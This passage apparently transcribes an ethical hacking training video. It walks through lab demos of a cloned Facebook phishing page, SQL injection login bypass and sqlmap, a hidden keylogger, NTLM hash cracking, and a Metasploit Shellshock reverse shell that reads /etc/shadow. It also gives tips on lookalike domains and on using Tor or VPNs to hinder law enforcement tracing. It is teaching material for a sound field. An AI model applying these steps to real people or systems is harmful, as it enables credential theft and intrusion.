is let's say if I have now hosted this I
can craft a fake email send it across to
a victim saying uh your Facebook account
has seen some unforeseen activity create
a hyperlink using HTML coding within
that click here to access your account
and verify uh that the account is secure
and when they click on that link they
will be redirected to my fake page which
is here you can see the IP address is my
virtual uh the username and password the
page just refreshed and gave us the
login page again but now if you look at
the URL I'm actually on Facebook's login
page which is exactly the same that I
was hosting so early women wouldn't
probably figure out they've been hacked
by now they just would figure out okay
they probably typed in the incorrect
password and the page refresh or
something like that and they're just
going to log in and they're actually
going to access the Facebook page thus
they might not even realize that
something went wrong but if I go back to
my virtual machine you can see that it
has captured some data and it is
reporting over here of what has happened
so if I just scroll up let's see what
happened here and if you have been able
to capture anything so we got a hit
printing the output this does the HTTP
1.1 200 okay response coming in password
field phone and we're just looking there
it is email someone at somewhere.com and
password that I typed in ASD at the rate
one two three four so let us captured
the username and the password right here
uh once you're done I mean this is the
way attackers work now this is a very
basic attack again uh in the actual
trainings you would then look at how you
would Host this on a real website make
it a number will attack right now it's a
virtual machine with a class CIP address
so here the third processors where can
we get a free hosting where we can host
this kind of sites maybe I'll have to
purchase a domain which looks like
similar to Facebook or the victim that
I'm trying to attack so this is just a
POC so we just wanted to find out if we
can uh how phishing is done and this is
exactly how it is done right so pressing
Ctrl C would exit this tool and takes
you back to the actual menu press 99 99
to exit and there it is close the two
window and that's the fishing practical
after phishing let's talk about SQL
injection SQL injection stands for uh
structured query language injection
which is a database attack though it
resides within the application so is the
application vulnerability that we are
trying to look at to try to bypass
authentication as the name suggests a
SQL injection or limited allows an
attacker to inject malicious input into
a SQL statement what is a SQL statement
a query that is used by an application
and is fired off to the database
database executes that query gets that
information that is required and sends
it back to the user if the user is
authenticated so we're going to look at
a SQL injection attack demo here and
what we are going to do is we are going
to go back to our VMware Workstation and
I've got a tool over here called ovast
broken web application which is a
utility that has been created for people
like us to test our skills to learn on
how we can develop our skills further so
this has a lot of vulnerable
applications built within it we're just
going to try to access it and we are
going to see if we can create a SQL
injection attack just waiting for it to
boot up once it boots up it will give us
an IP address there we are so we need to
connect to 71.132 so I can just use the
same browser I was using close of
Facebook and now go to 192 168
71.132 and this is the ovas procal web
application project uh what we're going
to do is we're going to go to utility
day and this is a application that has a
lot of information within it you can see
it gives you links about what you should
do help me video tutorials listing of
vulnerabilities that they have and so on
so forth so you can see we are not
logged in right now I'm just going to do
this as a demo so what we're going to do
is we're going to look at this and
bypass authentication so we are taken to
the login page where you need a username
and password to log in I'm going to type
in test as the username and test as the
password click on login and you can see
that account does not exist so the
authentication mechanism works now what
we want to do is we want to create a
query now what does a query look like
when I type in a username and a password
if I just type in a single port here it
is going to create an error and this is
what a SQL query looks like select
username from accounts where username is
a single quote and then the exception
error happens so it's not showing the
rest of the query to us now what I'm
going to do is I'm just going to craft a
query here a single quote and give it a
condition or 1 equals one space hyphen
hyphen space What Happens hyphen hyphen
space is comments out anything after
that so the password field is being
commented out at this point in time and
I'm just giving it a condition where the
condition is true 1 does equal one and
if this condition is true it is going to
allow me to log in so you can see right
now we are not logged in this bypasses
the authentication mechanism and you can
see user authenticated and we are now
logged in as admin so uh in the training
what we need to understand as a whole is
how SQL Works what are the queries that
are structured with how you can what are
the testing operators now the single
code that we used that was an operator
in the SQL syntax what these operators
are how they function and then how you
can leverage these attacks there are
different tools that are given to you in
Kali as well that you can utilize so in
Kali Linux you can just open up a
command prompt and there's a tool called
SQL map you need to give it a particular
site so SQL map hyphen U for the UI
model and whatever the URL is now URL
here and then once you're here you just
press the enter key this tool will craft
all the queries in the background for
you you don't even have to no SQL query
or SQL languages uh this is a very easy
tool to utilize sadly I cannot demo this
on a live website because that would be
illegal but you can see how you can
operate this yourself that's what uh SQL
injections are all about moving on we
now talk about uh vpns virtual private
networks and a virtual private network
is basically a secure network that
allows me to anonymize myself over the
Internet so what I'm doing is I'm
connecting from here to a server that
encrypts my channel encrypts my
connection and thus allows me to keep my
data secure now the basic essence of a
VPN or a virtual private network is to
allow me this encryption mechanism where
I can encrypt and Safeguard my data the
added advantage that nowadays a VPN
gives is that you can allow us to spoof
our IP address or obfuscate our IP
address so we can actually become
Anonymous on the internet it can allow
us to use multiple IP addresses and thus
secure ourselves on the internet for
example I use VPN called cyberghost and
what this allows me to do is it allows
me so many servers over here if you look
at the entire list all the servers then
there are no spy servers which can
guarantee me that they are not going to
keep and store any logs and thus they
are not going to record any of the
activity that I'm doing right since they
are located out of Romania this becomes
a little bit more safer for me because
the government and the laws over there
are a little bit more relaxed than other
countries they give me different links
for torrenting for streaming for
connection feature so there are a lot of
vpns out there so for example let's go
to the website cyberghost.com so you can
see there's a sale going on 76 percent
sale or you can go on to expressvpn
which is also a very good VPN then there
is not VPN it depends on what uh you
want and how you want to utilize it so
just purchasing a VPN or getting a free
free VPN is not enough it depends on
which country the VPN originates from
and which server you're connected to for
example most of the countries have a
pact where they share information
amongst themselves even if you're
connected to a VPN that means that these
companies that provide these Services
have to generate and store logs and
these logs have to be reported to the
government if they ask for it now if
there's a list of 14 countries that
actually uh focuses on this practice so
you have to find out VPN that and a
server that is not a part of those 14
countries and ensure that those logs are
not going to be reported to the
government and these are three vpns
basically are something that which are
good and I personally use cyberghost I
have used others I just keep on rotating
them just to get an idea of which one is
by better so these are vpns that you can
allow you to anonymize yourself on the
internet moving on these are the ones
that we talked about there are other
safer VPN hide my ass expressvpn and so
on so forth from our terminologies let's
now talk about VPS uh VPS is basically
virtual private server where you can
rent a service or server as a service a
virtual machine as a service so
basically on a cloud using
infrastructure as a service you can rent
a server and utilize it for whatever
activity you want so let's go to these
sites register.com God ID Network
Solutions or we can talk about other
Cloud Solutions as well so here you can
get register your domain names so in the
previous exercise for let's say when we
talked about the phishing exercise what
we want is we can go on to register.com
or we can go on to godaddy.com and we
can purchase a particular domain for
example something like this instead of
the OS I'm typing in a couple of zeros
for for the Facebook and see let's see
if anything of that is available now
something dot photo is available or
facetips.com is available uh there are
other options that are making over here
that they're giving us over here and
once we purchase this we can then have
our own hosting uh with a web hosting as
a service and we can have a Linux based
hosting or a Windows based hosting
depending on what you want and that's
where your shared hosting comes with the
picture if you just want uh if you want
to look at a virtual server and you want
to rent a server over there itself you
can move on to rackspace.com and here in
your services you can have physical
server or a virtual server in a public
Cloud your other Cloud providers for
example would be Amazon AWS and on AWS
you can basically look at ec2 elastic
compute Cloud which is basically virtual
servers in the cloud and over here you
can rent out a server with whatever
capacity you require you'll obviously
have to pay the rent for what those
servers are going to cost but once you
have those servers you can then launch
any services on top of it uh looking at
other services that we have we talked
about Tor tar is a onion routing
software that allows users to browse the
web anonymously so we can just go online
and we can try to spoof our identity and
I'm going to show you how so I've got a
VMware Workstation right here the one so
we're just going to pull that up and
we're going to power on a Windows 7
machine where you're going to look at
the onion routing so Windows machine has
booted up we're just going to log in and
this is my Windows 7 machine now I've
got a Chrome browser right here and
we're going to go to a website called
see myip.com which is going to give the
IP address that I'm currently using so
right now I'm not on connected to any
VPN or anything and you can see that's
my IP address that I'm utilizing now if
I want to anonymize myself what I'm
going to do is I am going to use star
and that's the our browser that's set up
right there if I click on it it's going
to open up the software and it's going
to create a new network and it's going
to connect to the tornetwork and allow
me to anonymize myself right so that's
the top browser opening up and giving me
a new browser over here so I've got one
which is the old one which is my current
IP address if I just refresh that you'll
see that I'm still on the same IP
address as far as this browser is
concerned there's a refresh and it's
still showing you the same IP address
where if I go on to Thor right now and
if I go to see my ip.com you will see
that it is going to give me and you can
see the amount of time it is taking to
reach that site that's because I am
using a VPN and there's a lot of
encryption running off and you can see
now I'm suddenly connected via Hong Kong
and even to reach this site what Tor
does is it gives me a proxy chain a
proxy chain is where it creates multiple
hops to hide my identity and before I
reach see my ip.com I am using three
different AP addresses over here one in
France one in Germany and one in Hong
Kong so if I do something over here to
trace back my steps to my actual IP
address the law enforcement agencies or
anyone who's going to search like a
forensic investigator would have to go
through these IP addresses before they
come back to me now it's not impossible
but the effort and time that's going to
be taken to come across three different
countries is going to be phenomenal so
it may just defeat the purpose of having
so much resources spent to identify who
did what so that's what taught does for
us all right moving on from Tor we are
going to look at keyloggers keyloggers
are basically softwares that run in the
background and record all the keys of
the user so if I've got a keylogger
installed right now whatever I type will
be stored in a text file for the hacker
so that they can look at it later on and
just to give you an example of that we
go back to my VMware Workstation and we
open up another Windows 7 machine I'm
going to power this on and I'm going to
close this one till then so this virtual
machine has booted up we are going to
use user One login as user one just
close all these softwares which are not
required and once this machine is booted
up what we're going to do is I'm just
going to open up a random websites and
see what we're doing basically there's a
keylogger that's there in the startup
that's going to record our keystrokes
and we just want to see what it actually
does now Firefox is getting updated so
let's hold on now this is the latest
version of Firefox right and you're just
going to go to let's say facebook.com
wait for the website to open up all
right let's try opening it up again and
that's facebook.com and we're just going
to type in some random username and
password somewhere someone at
somewhere.com and the password being
again ASD at the rate one two three four
five six seven eight nine zero login
obviously that login is not going to
work user probably doesn't exist or if
it does the password probably is kind of
Incorrect and uh so we're going to close
this we're going to let's say open up
another browser window go to another
site uh
rediff.com and then go to rediffmail try
the same thing over here someone add
somewhere.com password
hd31234567 whatever it is don't say we
can see the combination is incorrect now
there's a key logger running in the
background and what we want is we now
want to open up the keylogger now it is
visible here because I've kept it
visible you can hide it in the start
menu and there's a shortcut key for you
to pull it up later on so this
completely becomes invisible and what it
can do is it basically creates a record
of whatever you have been doing so far
so you can see these things populating
on the 25th of December so if I look at
the visited website you can see I open
up Mozilla Firefox the first where it uh
there was a problem loading the page
then we opened up Facebook then we open
up rediffmail.com and so on so forth so
this it just gives me the list of
visited websites whereas if I look at
Key stocks and clipboard you will see
whatever we have typed in so we first
typed in facebook.com then again the
second time I try try to type in then I
hit backspace then I type in
facebook.com and then you can see I
typed in someone at somewhere.com and in
tab ASD at the rate one two three four
five six seven eight nine zero we closed
up the browser we opened up a new one
and we went on to rediffmail.com and
then you can see me typing this one then
going back one space then the rest of
what I typed and then the password
coming in so that's what a keylogger
does if you look at the taskbar it's not
going to show you a keylogger running in
the background it's in processes you're
not going to see anything at all but
it's going to mask itself as a service
so if you look into the properties you
can see that icon coming in over here
which matches this one and so you can
see that this masking itself as a
service.exe if this gets hidden as well
it would be very difficult for a user to
even identify this all right right so
that's what a key logger is moving on
let's see what else we want to talk
about so we've talked about torque we've
talked about keyloggers and now we want
to talk about firewalls now for
keyloggers to be prevented we need
antiviruses right so we need a good
antivirus program that's going to be
installed updated and run on a regular
basis to protect ourselves from malware
but what about network connections and
you need a firewall and a system to
prevent or to detect what kind of
connections are going on in the first
place now we cannot rely on software as
100 so even if a firewall is not
configured properly that's that's going
to be a problem so what we need to do is
we have to have a firewall configure it
correctly and then allow and this allow
certain activity from off happening and
what we are going to do is I've got such
a system on my machine here I use a
software called glass wire what it does
is it is a network analyzer so it allows
me to analyze whatever is going on you
can see all the apps that I'm utilizing
and how much upload and download they
have been doing all the traffic so you
can see the protocols that I'm utilizing
so I come to know what's going on in the
background and this gives me the entire
graph of how much I have been doing for
the past 24 hours past three hours past
five minutes and so on so forth right so
this is what the activities and these
are the alerts that it has been
generating I can click on those alert
and it will start telling me what it was
all about if the graph doesn't work for
me it gives me usage as well so how much
I have utilized since I've installed
this software right and what
applications have been utilized which
hosts have been connected to and the
traffic type that was utilized and then
the things on my network so these are
the devices that I have currently on my
network that has been that have been
identified and then comes the firewall
so on the firewall the firewall is
clicked on you see all those services
that have been identified and again just
click on a particular service to lock
that service so this becomes a discovery
tool identifies whatever networking is
going on gives me all that information
and then I can look at and I can just
click on any of these services that I
find it as as malicious and block them I
can create different profiles for
different applications as I'm as and
when I want them and these are the
alerts so you can see that this was the
first time a network connection was
looked at from VMware and what this
allows me to do is whenever I execute a
file it can upload it to virus total.com
and scan it as a third-party antivirus
to ensure that there is nothing
malicious on it so I already have an
antivirus over here but if this ever
gets compromised I still can rely on a
third party service where in real time
as an and when I execute my applications
uh they would be verified and I would be
assured that nothing is wrong with my
system and this software that I'm
utilizing glassware basic is free and
then there are paid versions as well
it's just glasswire.com is where you're
going to find this moving on rootkit
root kits are also malicious softwares
that you allow and unauthorized user to
have access to a computer to restrict
areas of its software now a rootkit in
is a sensors which a software a
malicious software that infects a
machine and prevents a some
functionality from it like hiding data
or preventing users from running
antiviruses and it's basically a
malicious software that is used to hide
information from the victim so that they
would not realize that they have
actually been compromised it's going to
be a difficult showing of a root kit so
I cannot show that demo to you so we're
just going to move on and we are going
to talk about ethical hacking techniques
now now when we say ethical hacking
techniques we want to look at what kind
of audits are available when we want to
do ethical hacking so there's a black
box audit a white box audit and a gray
box audit so if I'm invited in an
organization to conduct a test to
conduct a audit to conduct a
vulnerability assessment or a
penetration test to identify
vulnerabilities and then try to plug
them out they are going to give me three
different variations in a black box
audit they're not going to tell me about
the infrastructure they're not going to
give me any information and they want me
to start from the basics of gathering
information identifying the systems and
based on the information that I gather
whether I'm able to develop any hack X
and compromise their infrastructure so
it will be a simulation of a hacker
who's sitting outside the organization
and trying to find a way in whereas a
white box audit is where full
infrastructure knowledge is given
anything and everything that is required
for an audit is given and this is a
simulation of an Insider attack a person
sitting inside the organization misusing
their permissions and then trying to
compromise trying to get access to data
that they do not have access to so the
simulation is from a malicious Insider a
gray box is where some partial knowledge
is available and from that partial
knowledge you're going to try to build
up more information and then you are
going to try to get access to those
resources what are the tools that we
utilize so we have already had a couple
of demos on keyloggers SQL injection SQL
map and so on so forth Metasploit is uh
very much used tool for penetration
testing and having knowledge on
Metasploit is very much necessary as far
as ethical hacking is concerned nmap
this is a tool used for network
discovery necess a vulnerability scanner
why shark is a packet capturer that
allows you to capture packets and
analyze whatever is going on SQL map is
something that we have seen a SQL
injection attack tool which generates
its own queries and John the Ripper is a
password cracking Tool uh backtrack used
to be an operating system that was
utilized for penetration testing however
backtrack has now been replaced by
something called Kali Linux and that's
the operating system that we have
utilized in all our demos where we try
to look at SQL map and those injection
attacks that we did so what are the
areas of ethical hacking we have just
talked about all these areas as well
Network Services we looked at the
glassware application that showed us how
my machine is consuming networks which
Protocols are being consumed how the
connections have been created if
somebody is able to install a corrosion
on my machine it is going to try to
create a new connection on the network
with the hacker to allow that hacker a
back door access now if I have that
glass wire or a similar firewall
implemented it is this wire wall that is
going to detect it and prevent that
connection from happening so if I
install a software that is certainly
suspicious or that install something
else in the background that I may not be
aware of that tool is going to identify
all the connections that are being made
and it is going to highlight that
connection I need to go through all of
those connections and identify whether
they are legit or not and if I find some
suspicious or doubtful I am going to
block that connection and then I'm going
to investigate what's going on and
that's where ethical hacking comes into
the picture you want to find out if your
firewall that you have implemented is
going to work correctly or not if the
configuration of the firewall is done
properly or if the firewall is
misconfigured is it leaking out
information right at the same time
you're looking at web applications we
looked at the ovas broken web
application where we did some SQL
injection attacks right so that was a
weakness or a vulnerability in that
application which would allow us to
bypass authentication and get access to
resources that we were not authorized
for and then client-side attacks would
be where uh you install keylogger at the
end of the at the client system and then
you try to capture whatever data the
user is typing in like usernames and
passwords on the Facebook and the
redefmail.com website that we saw and
then try to misuse that information to
get access to those resources then Wi-Fi
networks right Wi-Fi is something that
we use on a regular basis we got a smart
devices nowadays smartphones tablets
phablets that we can connect to Wi-Fi
and start using all our services our
banking applications and our smartphones
and thus we want to ensure that wireless
connectivity is simple and is secured so
you want to use encryption mechanisms
you want to use tools on your
smartphones anti-viruses firewalls on
your smartphones to ensure that whatever
you are utilizing is going to remain
secure and then social engineering we've
looked at the phishing website on
facebook.com you've seen how easy it is
to clone websites and host them on
Apache server so if you look at it as a
from ethical hackers perspective the job
of ethical hacker is to simulate these
kind of attacks that a hacker May
conduct and first of all you're
basically going to find out areas where
these attacks can happen think of it
from a hacker's perspective try to
simulate those attacks and see if those
attacks are going to be effective can
those that
security controls that you have put in
place identify detect and prevent these
attacks from happening in the first
place and that is what ethical hacking
is all about let's look at the
Metasploit attack Metasploit is a
framework of penetration testing that
makes hacking very simple you just need
to know how to utilize the tool you need
to identify the vulnerability associated
with a particular exploit and then run
the exploit on Metasploit we'll be
demoing this during the Practical so
there are active exploits and passive
exploits inactive exploits exploits a
specific computer runs until execution
and then exits uses brute force and
exits when an error occurs in a passive
exploit these exploits wait for incoming
requests and exploit them as soon as
they connect they can also be used in
conjunction with emails and web browsers
so in passive exploits we create a
preload we like a reverse connection
payload we send it to the victim once
the victim installs that software the
machine will then initiate a connection
to us our machine will be in a listen
mode and then we will once the software
is executed at the end we would then try
to connect and exploit that particular
vulnerability this is the uh practical
that we'll be doing on Metasploit so
let's move on with the demos and then
we'll see uh what we can discuss amongst
them all right let's have a look at some
of the demos that we had talked about in
the ethical hacking and penetration
testing module we are going to look at
three different demos the first one is
going to be a SQL injection attack that
we are going to perform on this tool
that we have the second one is a
password cracking attack on Windows 7
and a third one is a meter reader based
or a Metasploit based shell shock attack
on a Linux based web server so let's get
cracking I've powered on this virtual
machine which is the ovas broken web
application it is a tool that is
provided for people who want to enhance
their skills and they can practice how
to do these attacks in a legal manner so
we are going to go to this site I'm just
going to open up my browser the IP
address is 71.132 and that's the ovas
broken web application that we want to
utilize we're going to head off to
mutility2 and we are going to look at a
SQL injection attack where we want to
bypass authentication now this takes us
to the login screen so we can just try
our luck here and see that the
authentication mechanism works the
account does not exist so the username
and password that we have supplied is
not the correct one so we want to ensure
that there's a SQL database and we can
try to attack it and see if we can
bypass the authentication now what we
want to do is we want to create a SQL
based malformed query that can give us a
different output so I'm just going to
type in a single quote over here and
type login and you can see that this is
now suddenly recognized as a operator
and there's an error that is given out
compared to the login that we tried
earlier when we used a proper text based
login mechanism it gave us the account
does not exist but here the single code
gave us a error and it shows us how SQL
works this is the query that we had
created now in the trainings that you
have for ethical hacking there would be
explanations of what these queries are
all about how the syntax works here
we're just going to see if we can create
a malform query to log in as a user in
this case so what I'm going to do is
create the query over here I'm going to
give it a comparison so we're going to
give it R 1 equals 1 space hyphenation
space and if you now click login you
should be able to bypass authentication
and you can see user has been
authenticated and we now have admin
access to this application now here the
SQL queries need to be crafted in such a
perspective that they're going to work
so there would be a lot of exercise in
identifying what the database is there's
a Microsoft database an Oracle database
and so on so forth and then you have to
choose those proper commands but
identifying that would come in the
training right now we're just looking at
a demo this is how a SQL injection
attack works now let me log out here
similarly now we are in a login page the
same query work one vendors where it
allowed us to bypass authentication so
it also depends on what kind of page I
am and what query would be accepted at
this point in time so here application
understanding would also come into the
picture where uh which function we are
calling upon when we are connected to a
particular page now this is a user
lookup function right so again here we
try the same method test test that's not
going to work authentication error bad
user or password and if you type in the
same query over here single quote or and
give it a condition single quote or one
equals one space hyphenation space now
here it is not going to log Us in
because this is not a login page this is
a user lookup form so here it will
instead give us a dump of all the
databases that it has so you can see all
the usernames and passwords coming in
that are stored in the user lookup field
so this is where the understanding comes
in of which query to create at what page
we are depending upon the function that
is being called right so that's the SQL
injection attack that we wanted to look
at let's move on to password tracking
now this is a Windows 7 machine that we
have I'm just going to do a very basic
password tracking example we're just
going to log in now here the assumption
is that we are able to log in we have
access to a computer and we want to
check out other users who are using this
computer and see if we can find out
their passwords so that we can log in as
a different user steal data if required
and we wouldn't be to blame if there are
any logs that are created so here we've
got a tool called K N able that is
installed right here now I'm already an
administrator on this machine I am
checking out other administrators who
share the same privileges or any other
user who may be on this system whose
password I can crack and thus I would be
able to get access through their account
and then do any malicious activity right
so this allows me to go into a cracker
tool and it allows me to enumerate this
machine and identify all the users and
passwords that are there in this
particular machine right so I'm just
going to click on the plus sign and I'm
going to import hashes from a local
system so where are these files stored
where does Windows store its passwords
and what format are they stored and what
this tool does to retrieve those that's
something that we all need to know as a
ethical hacker right so import the
hashes from the local system click on
next it's going to enumerate that file
and it is going to give you a list of
all the users that are there so you can
see the users or hacker admin test the
one that we are logged in as and then
there's a user called virus as well and
you can see that this is the hash value
of the password that is being utilized
now there's a particular format for a
hash value for Windows and how it stores
but once we have these hash values let's
say if I want to crack this password
there are various attacks that we can do
for example a dictionary based attack or
a Brute Force attack let's try a Brute
Force attack right ntlm is the hashing
mechanism that is used by windows so we
are going to try to create an ntlm hash
attack and here we are going to use a
predetermined rule set for example we
are not sure what characters are being
utilized over here so we just create an
attack like this using all characters
and uh lowercase A through Z uppercase A
through Z numeric zero through nine and
all the special characters let's say the
password is between 7 and 16 characters
and this is the character set that you
want to try the Brute Force attack on
what is a group Force attack it is an
attack where the computer is going to
try each and every permutation and
combination out of this character set
and try to figure out if the password is
going to be correct so if we click Start
it's going to start with a particular
characters and then it is going to
identify if that ntlm hash is going to
work against this character and you can
see the time is going to be phenomenal
over here so it's not necessary that
this attack would be viable it will be
100 successful given the time frame
however the time frame is huge enough
for this attack to become a little bit
redundant there are other attacks that
we can do which can easily identify this
data data for us as well but that is
something that we will look on in future
videos so that's how you can get access
to users and passwords there are
different mechanisms where let's say we
don't have login access then what are we
going to do how we can create a fake
user login or how we can remotely access
a machine and then try to get the same
access and that is what we are going to
try to do in the next demo on a Linux
machine so what we are doing in a Linux
machine could also be doable on the
Windows machine with a different exploit
so what I'm going to do is this is the
lineage web server that I have that I'm
going to power on I'm going to use a
Kali Linux machine to hack that device
and I'm going to just power off my
Windows 7 machine give it a minute till
it boots up now this is also a demo
machine that we have which has its own
pre-configured vulnerabilities so here
we've got something from the pen testers
lab and has a shell shock vulnerability
implemented inside shell shock
vulnerability affects Linux Mac and Unix
based operating systems for a particular
version of The Bash shell bash is the
bone again shell which is the command
line interface in these operating
systems so what we are trying to do here
is we are going to use the Kali Linux
machine try to find out the
vulnerability over here and if it exists
we are going to use Metasploit to attack
this machine now the first and foremost
thing is we want to identify the IP
address we have no idea what the IP
address is we are in the same subnet so
we are assuming that we are able to
connect to this machine so what I'm
going to do is I'm going to open up a
tool called zenmap I'm going to open up
a command line interface find out what
my IP address is and my purpose is this
with a subnet mask of
255255255.0 so I want to see if there
are any other machines that are live in
the same subnet and we are doing a ping
swipe over here to identify which
machines are live in a minute we'll get
all the IP addresses 71.1 to 133 254 and
128 we know that VR 128 at this point in
time uh 254 is the ATP server so we are
assuming that 133 is the machine that we
want to look at and let's then try to
see if we can scan that machine 133 and
we're going to do an intense scan to
find out which ports are open what
services are running over there and if
it is whether the pin test machine that
we were looking for you can see of the
start Port 22 and Port 80 and somewhere
here it's going to give us the ports
that are open and the details about
those ports and somewhere here it will
tell us that this is the pen tester lab
machine that we wanted which is correct
so now we want to do a vulnerability
analysis on this what we are going to do
is I'm going to use another GUI based
tool called Sparta which I can just find
out from here Sparta uses two tools in
the background nmap tool and a tool
called Necto so we're just going to
start scanning 192 168
71.133 was the IP address add to scope
and over a period of time you can see
all of these will start populating with
information the VR that's the nickto
tool coming in scanning on Port 80 which
is uh which means that it's a web server
using HTTP it tells us it's an Apache HD
httpd 2.2.21 and gives us the 22 port
number as well if we head over to the
tab of nickto or let's look at the
screenshot first this is what the
website would be looking like and nikto
gives us the options over here it tells
us that there is a vulnerability over
here for shell shock and this is the
path where the vulnerability is going to
exist so what we're going to do we go
back to the command line sorry you open
up a new one minimize all these other
windows and we are going to open up
Metasploit Metasploit is a penetration
testing tool that is used by most
hackers and ethical hackers to test
applications and test existing exploits
and vulnerabilities so just give it a
minute till it starts you can see there
are already around 1700 exploits right
here uh we're going to see all those
exploits with these commands Okay we are
sorry for the typo and it will just give
us a list of all the exploits that are
stored in metaspoid in this version so
all of these are windows based if we
scroll up we will be looking at other
vulnerabilities as well or exploits the
unique specs exploits linax OS X
multi-exploits and we are looking for a
exploit for a multi-based Apache or HTTP
let's go up uh let's look at so this is
the one that we're looking for Apache
mod CGI bash environmental executable so
what we're going to do is we're just
going to copy it go back to the bottom
say use exploit and paste the one that
we wanted press enter say show options
so it will ask us to configure this I'm
just going to configure it based on the
knowledge that we have set our host
which is the remote host the victims
machine so we put in the IP address it
asks us for the Target URI so that's the
path that we saw set Target URI to CGI
hyphen bin slash status enter now with
exploit we need to find a payload that
is going to give us the output that we
want so we say show payloads I will give
us a list of all the compatible payloads
with this exploit and we want to create
a reverse TCP connection which is this
so we know it's a Linux operating system
we want this payload to be set so set
payload okay Center that's the payload
coming in show options now that we have
set the payload this is the options for
the exploit and now we want to set our
options for the payloads as well so we
are creating a reverse TCP connection
which means we are remotely executing
code at the victim side and making the
victim connect back to our machine which
means we need to set up a listener so I
need to put my IP address over here set
localhost or lhost
192.168
71.128 which was our IP address show
options again just to ensure everything
is fine which looks like it is and we
then type in the word exploit so that it
will start the second attack I can see
that it has created a metabolita session
at the victim site and it has opened up
a session so if I do a PWD now PWD is a
Linux command for present working
directory and it will show us that we'll
connect it to where www CGI hyphen wind
do an LS it will list all the files
that's the status file over there do a
CD backslash it will take us to the root
of this machine now remember we saw the
passwords on a Windows machine similarly
we can head over to the cdetc folder LS
and you can see these files psswd and
Shadow now psswd is the file where Linux
Stores its usernames and Shadow is the
file where passwords are shown so do a
cat command psswd and you can see these
users coming up so you can see the last
user pen test lab and you can see there
are no passwords so let's do a cat
Shadow and that's your hash value for
the password that we have for the user
pen test lab so these are the different
attacks that we need to understand and
and we need to create based on the
vulnerabilities that exist on different
machines so we just looked at windows
and Linux and how we can exploit them
depending on existing vulnerabilities as
a ethical hacker this is uh what we need
to learn in our trainings and then we
need to clear our exams based on this
knowledge of how these things work so
that we get certified and then we can
position ourselves for the penetration
testing jobs with the rise in censorship
and general fear of a privacy loss
consumer security is at an all-time high
risk technology has made our life so
much easier while putting up a decent
Target on our personal information it is
necessary to understand how to
simultaneously Safeguard our data and be
up to date with the latest technological
developments maintaining this balance
has become easier with cryptography
taking its place in today's digital
world so here's a story to help you
understand cryptography meet Anne and
wanted to look for a decent discount on
the latest iPhone she started searching
on the internet and found a rather Shady
website that offered a 50 discount on
the first purchase once and submitted
her payment details a huge chunk of
money was withdrawn from a bank account
just moments after
devastated and quickly realized she had
failed to notice that the website was
their HTTP webpage instead of an https
one
the payment information submitted was
not encrypted and it was visible to
anyone keeping an eye including the
website owner and hackers Hatcher used a
reputed website which has encrypted
transactions and employs cryptography
our iPhone Enthusiast could have avoided
this particular incident this is why
it's never recommended to visit unknown
websites or share any personal
information on them let's Now understand
what cryptography is
cryptography is the science of
encrypting or decrypting information to
prevent unauthorized access we transform
our data and personal information so
that only the correct recipient can
understand the message as an essential
aspect of modern data security using
cryptography allows the Secure Storage
and transmission of data between willing
parties
encryption is a primary route for
employing cryptography by adding certain
algorithms to Jumble up the data
decryption is the process of reversing
the work done by encrypting information
so that the data becomes readable again
both of these methods form the basis of
cryptography
for example when simply run is jumbled
up or changed in any format not many
people can guess the original word by
looking at the encrypted text the only
ones who can are the people who know how
to decrypt the coded word thereby
reversing the process of encryption
any data pre-encryption is called plain
text or clear text to encrypt the
message we use certain algorithms that
serve a single purpose of scrambling the
data to make them unreadable without the
necessary tools these algorithms are
called ciphers they are a set of
detailed steps to be carried out one
after the other to make sure the data
becomes as unreadable as possible until
it reaches the receiver we take the
plain text pass it to the cipher
algorithm and get the encrypted data
this encrypted text is called the cipher
text and this is the message that is
transferred between the two parties the
key that is being used to scramble the
data is known as the encryption key
these steps that is the cipher and the
encryption key are made known to the
receiver who can then reverse the
encryption on receiving the message
unless any third party manages to find
out both the algorithm and the secret
key that is being used they cannot
decrypt the messages since both of them
are necessary to unlock the hidden
content
wonder what else we would lose if not
for cryptography
any website where you have an account
can read your passwords imported emails
can be intercepted and their contents
can be read without encryption during
the transit more than 65 billion
messages are sent on WhatsApp every day
all of which are secured thanks to
end-to-end encryption
there is a huge Market opening up for
cryptocurrency which is possible due to
blockchain technology that uses
encryption algorithms and hashing
functions to ensure that the data is
secure if this is of particular interest
to you you can watch our video on
blockchain the link of which will be in
the description
of course there is no single solution to
a problem as diverse as explained there
are three variants of how cryptography
works and is in practice
they are
symmetric encryption
asymmetric encryption
and hashing let's find out how much you
have understood until now do you
remember the difference between a cipher
and ciphertext leave your answers in the
comments and before we proceed if you
find this video interesting make sure to
give it a thumbs up before moving ahead
let's look at symmetric encryption first
symmetric encryption uses a single key
for both the encryption and decryption
of data it is comparatively less secure
than asymmetric encryption but much
faster it is a compromise that has to be
embraced in order to deliver data as
fast as possible without leaving
information completely vulnerable
this type of encryption is used when
data rests on servers and identifies
Personnel for payment applications and
services the potential drawback with
symmetric encryption is that both the
sender and receiver need to have the
same secret key and it should be kept
hidden at all times Caesar Cipher Enigma
machine are both symmetric encryption
examples that we will look into further
for example if Alice wants to send a
message to Bob she can apply a
substitution Cipher or a shift Cipher to
encrypt the message but Bob must be
aware of the same key itself so he can
decrypt it when he finds it necessary to
read the entire message
symmetric encryption uses one of the two
types of ciphers stream ciphers and
block ciphers
block ciphers break the plain text into
blocks of fixed size and use the key to
convert it into ciphertext stream
ciphers convert the plain text into
ciphertext one bit at a time instead of
resorting to breaking them up into
bigger chunks in today's world the most
widely used symmetric encryption
algorithm is AES 256 that stands for
advanced encryption standard which has a
key size of 256 bit with 128-bit and 196
bit key sizes also being available other
primitive algorithms like the data
encryption standard that is the Des the
triple data encryption standard 3des and
Blowfish have all fallen out of favor
due to the rise of AES AES chops UPS the
data into blocks and performs 10 plus
rounds of obscuring and substituting the
message to make it unreadable
asymmetric encryption on the other hand
has a double whammy at its disposal
there are two different keys at play
here a public key and a private key the
public key is used to encrypt
information pre-transit and a private
key is used to decrypt the information
post Transit if Alice wants to
communicate with Bob using asymmetric
encryption she encrypts the message
using Bob's public key after receiving
the message Bob uses his own private key
to decrypt the data this way nobody can
intercept the message in between
transmissions and there is no need for
any secure key exchange for this to work
since the encryption is done with the
public key and the decryption is another
private key that no one except Bob has
access to both the keys are necessary to
read the full message
there is also a reverse scenario where
we can use the private key for
encryption and the public key for
decryption a server can sign
non-confidential information using its
private key and anyone who has its
public key can decrypt the message
this mechanism also proves that the
sender is authenticated and there is no
problem with the origin of the
information
RSA encryption is the most widely used
asymmetric encryption standard it is
named after its Founders West Shamir and
Edelman and it uses block ciphers that
separate the data into blocks and
